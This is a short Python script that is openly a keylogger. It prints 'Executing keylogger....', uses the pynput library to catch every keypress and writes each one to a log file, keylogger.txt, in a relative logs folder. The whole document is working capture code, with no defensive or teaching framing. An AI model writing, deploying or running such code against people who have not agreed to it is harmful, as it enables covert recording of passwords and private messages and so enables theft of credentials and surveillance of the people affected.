from pynput.keyboard import Key, Listener
import logging

print("Executing keylogger....")

log_directory = '../appclass/logs/'

logging.basicConfig(
    filename = log_directory + "keylogger.txt",
    level = logging.DEBUG,
    format = '%(message)s'
)

def keypress(Key):
    logging.info(str(Key))

with Listener(on_press = keypress) as listener:
    listener.join()